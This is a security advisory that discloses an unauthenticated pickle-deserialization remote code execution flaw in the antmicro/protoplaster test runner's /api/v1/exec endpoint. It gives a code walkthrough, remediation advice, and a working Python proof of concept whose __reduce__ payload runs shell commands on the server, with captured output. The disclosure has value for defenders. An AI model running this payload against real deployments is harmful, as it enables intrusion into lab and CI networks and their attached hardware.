# VDR-015: Unauthenticated Pickle Deserialization RCE in antmicro/protoplaster

- **Target**: [antmicro/protoplaster](https://github.com/antmicro/protoplaster)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-502](https://cwe.mitre.org/data/definitions/502.html) - Deserialization of Untrusted Data
- **CVE**: [CVE-2026-51095](https://www.cve.org/CVERecord?id=CVE-2026-51095)
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Discovered**: 2026-06-05
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`protoplaster` is a hardware-in-the-loop test runner designed to be driven
remotely over an HTTP API. The API endpoint `POST /api/v1/exec` deserializes
the raw, **unauthenticated** request body with `pickle.loads(request.data)`
before performing any validation. Python's `pickle` executes arbitrary code
during deserialization (via the `__reduce__` protocol), so any client who can
reach the port obtains remote code execution as the user running the server.
The server binds to all interfaces (`SERVE_IP = "0.0.0.0"`) via
`waitress.serve(...)` and ships with **no authentication, authorization, or
network-binding restriction of any kind**. The endpoint is effectively an
unauthenticated remote-exec RPC. Affected: version 1.0 / current `main`
(commit `d396d8c`); the vulnerable file was last modified in commit `119c549`,
2026-03-20.

## Affected Component

- `protoplaster/api/v1/execution.py:25` - `data = pickle.loads(request.data)` in the `/api/v1/exec` handler (route declared at `:10`, `methods=["POST"]`)
- `protoplaster/conf/consts.py:7` - `SERVE_IP = "0.0.0.0"` (network exposure on all interfaces), no authentication

> Note on line drift: the original dossier referenced the sink at
> `execution.py:20`. In the audited `main` (commit `d396d8c`) the sink is at
> **line 25** — the function docstring grew (commit `119c549`,
> "Improve error message on ImportError") and shifted the executable line down
> by 5. The route declaration is at line 10 as stated. The bind constant
> `conf/consts.py:7` and the blueprint registration `protoplaster.py:210` match
> the dossier exactly. The `waitress.serve(...)` call is at `protoplaster.py:223`
> (dossier said 210, which is in fact the blueprint-registration line — minor
> drift, both points verified).

## Details

**Source -> sink.** The Flask blueprint that owns the endpoint is registered
unconditionally during server startup:

```python
# protoplaster/api/v1/__init__.py
def create_routes() -> Blueprint:
    api_routes: Blueprint = Blueprint("protoplaster-api-v1", __name__)
    ...
    api_routes.register_blueprint(
        protoplaster.api.v1.execution.execution_blueprint)   # /api/v1/exec
    return api_routes

# protoplaster/protoplaster.py
app = Flask(__name__)
CORS(app)                                                    # :205 - CORS open
...
app.register_blueprint(protoplaster.api.v1.create_routes())  # :210
...
serve(app, host=SERVE_IP, port=int(args.port))               # :223 (SERVE_IP="0.0.0.0")
```

There is **no** `@login_required`/auth decorator, **no** `before_request`
gate, and **no** token/API-key/bearer check anywhere in the `protoplaster/api`
tree (verified by exhaustive search). `CORS(app)` is applied with default
(permissive) settings.

**The sink.** The handler reads the raw HTTP body and feeds it straight into
`pickle.loads` as the very first executable statement:

```python
# protoplaster/api/v1/execution.py
@execution_blueprint.route("/api/v1/exec", methods=["POST"])   # :10
def execute_function():
    """..."""                                                  # docstring :12-24
    data = pickle.loads(request.data)                          # :25  <-- SINK
    module_name = data.get("module")                           # :26
    function_name = data.get("function")                       # :27
    args = data.get("args", [])                                # :28
    ...
    module = importlib.import_module(module_name)               # :37
    func = getattr(module, function_name)                      # :46
    result = func(*args)                                        # :54
```

**Why the `importlib` logic is irrelevant to exploitation.** The endpoint was
clearly designed as a remote-exec RPC: it imports a caller-named module,
resolves a caller-named function, and calls it with caller-supplied args
(`module`/`function`/`args` from the deserialized dict). That import-and-call
path is itself dangerous, but an attacker never needs it. `pickle.loads()` at
line 25 runs **before** line 26 ever executes. A pickle whose `__reduce__`
returns `(os.system, (cmd,))` runs `cmd` *during deserialization*. The handler
then attempts `data.get("module")` on whatever `pickle.loads` returned (the
`int` exit code of `os.system`), which raises `AttributeError` and yields an
HTTP 500 — but the command has already executed. The 500 is cosmetic; the
compromise happens at the deserialization boundary.

**Reachability.** `request.data` is the raw, unparsed request body, so no
content-type negotiation, multipart handling, or JSON parsing stands between
the network and `pickle.loads`. Any `POST /api/v1/exec` with an arbitrary byte
body reaches the sink.

## Proof of Concept

Tested end-to-end against the **verbatim upstream** `execution.py` blueprint
(loaded by file path from the fresh clone, commit `d396d8c`, and hosted on a
minimal Flask app via `waitress.serve(host="0.0.0.0", port=18805)` — identical
to `protoplaster.py:223`). The full upstream runner could not be booted
directly on the test host because its package `__init__.py` eagerly imports the
Linux/hardware-only test stack (`pytest`, `smbus2`, `spidev`, `pyudev`,
`pyrav4l2`, `eyescan`); the **deserialization code path itself is unmodified
upstream bytes**. See `NOTES.md` for the honest harness rationale.

**Payload (Python client):**

```python
import os, pickle, requests

class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned || whoami > C:\\pwned.txt',))

requests.post(
    "http://TARGET:18805/api/v1/exec",
    data=pickle.dumps(RCE()),                       # raw pickle as request body
    headers={"Content-Type": "application/octet-stream"},
)   # no auth header of any kind
```

**Steps:**

1. `git clone https://github.com/antmicro/protoplaster.git` (commit `d396d8c`).
2. Start the runner: `protoplaster --server --port 18805` (binds `0.0.0.0`).
   On a host where the hardware deps are unavailable, host the verbatim
   `protoplaster/api/v1/execution.py` blueprint on a minimal Flask app +
   `waitress.serve("0.0.0.0", 18805)` (see `poc/server_harness.py`).
3. Run `poc/exploit.py TARGET 18805`.
4. The injected command runs on the server host as a side effect of
   `pickle.loads`.

**REAL captured output** (from `poc/OUTPUT.txt`, unique per-run token proves
our payload executed inside the server process):

```
[exploit] target            : http://127.0.0.1:18805/api/v1/exec
[exploit] auth used         : NONE (unauthenticated)
[exploit] payload bytes      : 461 (raw pickle body)
[exploit] unique token       : 62dcf237cc494787974edc62b3357f46
[exploit] HTTP status        : 500 (error is EXPECTED -- RCE already fired during pickle.loads)

[exploit] ===== SENTINEL FILE CONTENTS (PROOF OF RCE) =====
VDR-008-PWNED 62dcf237cc494787974edc62b3357f46
Dennis
DESKTOP-AS05E6K
AMD64
[exploit] ===== END SENTINEL =====

[exploit] RESULT: CONFIRMED RCE -- unique token 62dcf237cc494787974edc62b3357f46 present
in sentinel written by the server process.
```

The server process executed an attacker-supplied OS command (`whoami` ->
`Dennis`, `hostname` -> `DESKTOP-AS05E6K`) with no authentication, confirming
unauthenticated remote code execution. The HTTP 500 is the expected,
documented consequence of the handler trying to call `.get()` on the `int`
returned by `os.system` *after* the command already ran.

## Impact

Unauthenticated remote code execution on the host running the protoplaster
server, with the privileges of the server process. Because protoplaster is a
**hardware-in-the-loop test runner meant to be driven remotely** and binds to
`0.0.0.0` by default, it typically sits on a lab/CI network with direct
electrical and software access to attached devices under test (I2C/`smbus2`,
SPI/`spidev`, V4L2 capture, GPIO, board power). An attacker who can reach the
port can therefore: execute arbitrary commands, pivot into the lab/CI network,
tamper with or brick attached hardware, exfiltrate firmware/test artifacts
(`/var/lib/protoplaster/artifacts`), and use the runner as a foothold against
the broader engineering environment. No user interaction, no prior credentials,
and no special conditions are required (CVSS 9.8).

## Recommendation

- **Remove the pickle transport entirely.** Never deserialize untrusted input
  with `pickle`. Replace the RPC body with a safe, non-code-executing format
  (e.g. JSON) and a strict schema.
- **Do not expose a remote module/function execution primitive.** The
  `import_module` + `getattr` + `func(*args)` design is itself an arbitrary-code
  primitive. If remote invocation is required, restrict it to an explicit
  allow-list of named, vetted operations — never caller-controlled
  module/function names.
- **Authenticate and authorize every request.** Require a signed and
  authenticated request (e.g. mutual TLS or an HMAC/token bound to the body)
  before any processing; reject unauthenticated callers at a `before_request`
  gate.
- **Bind to localhost by default** (`127.0.0.1`) and require explicit, deliberate
  opt-in (plus the auth above) to expose the runner on a network interface.
- **Tighten CORS** to a known origin allow-list instead of the current
  permissive `CORS(app)`.

## Status

| Date | Event |
|------|-------|
| 2026-06-05 | Vulnerability discovered during source code audit |
| 2026-06-05 | Working PoC confirmed |
| TBD | Coordinated disclosure to Antmicro + CVE request to MITRE CNA-LR |

## References

- [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
- [Upstream repository](https://github.com/antmicro/protoplaster)
